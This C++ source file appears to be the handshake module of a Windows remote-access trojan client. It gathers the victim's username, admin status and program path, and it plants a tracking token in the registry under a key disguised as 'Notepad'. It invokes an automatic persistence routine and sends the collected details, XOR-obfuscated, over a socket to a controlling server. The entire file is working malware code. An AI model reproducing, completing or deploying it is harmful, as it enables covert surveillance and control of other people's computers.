
#include "../inc/HandShake.h"
#include "../inc/Persistence.h"
#include "../inc/common.h"
#include "../inc/other.h"
#include "../inc/Exec.h"

using namespace  std;


HandShake::HandShake()
{
    a_name_user = setNameUser();
    a_is_admin = setIsAdmin();
    a_current_directory = setCurrentDirectory();

    a_token = getTokenOrSetTokenInRegistry();
    
    if((a_token.length()) != a_size_token) //If an error occurred and the token is not the size of a_size_token:
    {
        // Tokken not found
        a_token = generateToken(a_size_token);
    }
    wcout << a_token << endl;
    a_path_prog = setLocationProg();
}


VOID HandShake::setSock(SOCKET sock)
{
    a_sock = sock;
}


VOID HandShake::beforeHandShake()
{
    /*
    if(AUTO_MOVE) 
    {
        moveProg();
    }
    */
    //a_path_prog = setLocationProg();
    
    if(AUTO_PERSISTENCE)
    {
        Persistence(a_is_admin, a_path_prog).main();
    }

}


VOID HandShake::startHandShake()
{
    // ' SPLIT ' for split data in python server.py script
    wstring is_admin;
    wstring end = L"\r\n";

    if(a_is_admin)
    {
        //If admin
        is_admin = L"MOD_HANDSHAKE_IS_ADMIN" SPLIT "True";
    }
    else
    {
        //if not admin
        is_admin = L"MOD_HANDSHAKE_IS_ADMIN" SPLIT "False";
    }
    //cout << a_path_prog << endl;
    //cout << a_name_user << endl;
    wstring path_prog = L"MOD_HANDSHAKE_PATH_PROG" SPLIT + a_path_prog;
    wstring name_user = L"MOD_HANDSHAKE_NAME_USER"  SPLIT + a_name_user;
    wstring token = L"MOD_HANDSHAKE_TOKEN" SPLIT + a_token;
   
    sendUltraSafe(a_sock, XOREncryption(is_admin));
    sendUltraSafe(a_sock, XOREncryption(path_prog));
    sendUltraSafe(a_sock,XOREncryption(name_user));
    sendUltraSafe(a_sock,XOREncryption(token));
    sendUltraSafe(a_sock,XOREncryption(end)); 
}


BOOL HandShake::setIsAdmin()
{
    vector<string> result;

    result = Exec().executeCommand(L"powershell.exe -command \"([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')\"");
    if(result[0].substr(0,4) == "True") //remove ruturn line.
    {
        //cout << "ADMIN IN setadmin: " << result.substr(0,4) << endl;
        return true;
    }
    else
    {
        //2 cout << "NOT ADMIN IN setadmin: " << result.substr(0,4) << endl;
        return false;
    }
}


wstring HandShake::setNameUser()
{

    WCHAR user[UNLEN+1];
    DWORD len_user = UNLEN+1;
    if(GetUserNameW(user,&len_user) == 0)
    {
        //if error
        return L"Unknown";
    }
    else
    {
        wstring result(&user[0], &user[len_user]); //https://stackoverflow.com/questions/6291458/how-to-convert-a-tchar-array-to-stdstring
        return result.substr(0,result.length()-1);    
    }
    
}


wstring HandShake::setCurrentDirectory()
{
    WCHAR buff[MAX_PATH];
    if(GetCurrentDirectoryW(MAX_PATH, buff) ==  0)
    {
        //if error
        _wgetcwd(buff, MAX_PATH);
        return (wstring) buff;
    }
    else
    {
        return (wstring) buff;
    }
}


wstring HandShake::setLocationProg()
{
    WCHAR buffer[MAX_PATH];

    if(GetModuleFileNameW(NULL, buffer, MAX_PATH) == 0)//if error
    {   
        ;
        return (wstring) L"ERROR SET LOCATION PROG"; //To change !
        
    }
    else
    {
        return (wstring) buffer;        
    }
}


wstring HandShake::generateToken(CONST INT token_size)//https://www.codespeedy.com/generate-random-hexadecimal-strings-in-cpp/
{
    wstring token;
    WCHAR hex_characters[]={'0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F'};
    INT i;

    srand(time(0)); //https://stackoverflow.com/questions/1190689/problem-with-rand-in-c
    for(i=0;i< token_size;i++){token += hex_characters[rand()%16];}
    return token;
}


wstring HandShake::getTokenOrSetTokenInRegistry()
{
    wstring tmp_return;

    CONST WCHAR name[] = L"config"; //name of string key.
    WCHAR token[a_size_token];

    LONG status; //allows to check the situation of the functions 
    HKEY hKey;

    WCHAR buffer[4096] = {0}; 
    DWORD lpcbData = sizeof(buffer); 

    DWORD lpType = REG_SZ; 

    HKEY HKEY_admin_or_not = NULL;
    WCHAR path_of_key[MAX_PATH];

    //Initialization of variables according to privileges. 
    if(a_is_admin) //test if admin | if admin set  HKEY_LOCAL_MACHINE else set HKCU
    {
        //if user is admin
        HKEY_admin_or_not = HKEY_LOCAL_MACHINE;
        wcscpy(path_of_key, L"SOFTWARE\\WOW6432Node\\Notepad");
    }
    else
    {
        //if user not admin
        HKEY_admin_or_not = HKEY_CURRENT_USER;
        wcscpy(path_of_key, L"Software\\WoW6432Node\\Notepad");
    }

    //test if key exist (key = Notepad)
    status = RegOpenKeyExW(HKEY_admin_or_not, path_of_key, 0, KEY_ALL_ACCESS, &hKey); // 
    if(status != 0) //ERROR_SUCCESS = 0
    {
        //KEY Notepad no exist  | create key and set token.
        status = RegCreateKeyExW(HKEY_admin_or_not, path_of_key, 0, NULL,  REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey,NULL);
        if(status != 0)
        {
            //if If the notepad key has not been created.  
            return generateToken(a_size_token);
        }
        else
        {
            ;
           // cout << "[+] Key is create...." << endl;
        }
    }
    
    //get value (string)
    status = RegQueryValueExW(hKey, name ,NULL , &lpType, (LPBYTE) &buffer[0] , &lpcbData); 

    if(status != 0)//If token no set
    {
        //string of key not found or token is not defined.
        wcscpy(token, generateToken(a_size_token).c_str()); //(data)
                
        //set key:
        status =  RegSetValueExW(hKey, name ,0, REG_SZ, (LPBYTE) token, lpcbData);
        if(status != 0)
        {
            //If an error lores the attribution of the token. (fuck windows)
            //cout << "FATAL ERROR" << endl;
            ;
        }
        //the token was well initialized.
    }

    else
    {
        //cout << "token no set" << endl;
        RegCloseKey(hKey);        
        return (wstring)buffer;
    }
    //cout << "token set " << endl;
    RegCloseKey(hKey);
    
    return (wstring)token;
    
}


BOOL HandShake::getIsAdmin()
{
    return a_is_admin; //ghetter
}


wstring HandShake::getPathProg()
{
    //cout << "GetPathProg: " << a_path_prog << endl;
    return a_path_prog;
}


wstring HandShake::getNameUser()
{
    return a_name_user;
}

wstring HandShake::getToken()
{
    return a_token; 
}

/*
VOID HandShake::moveProg()
{
   // Deplace le programme en fonction des privilèges de l'utilisateur.
    if(a_is_admin)
    {   
        if((rename(a_name_prog.c_str(), (a_path_prog).c_str())!=0))
        {   
            a_path_prog = a_current_directory + "\\" + a_name_prog; //if error
        }
    }
    else
    {
        //C:\Users\cisco\AppData\Roaming\Microsoft
        //if not adminW
        if((rename(a_name_prog.c_str(),(a_path_prog).c_str()))!= 0)
        {
            //perror("Error in move prog ");  
            a_path_prog = a_current_directory + "\\" + a_name_prog; 
        }
    }
}
*/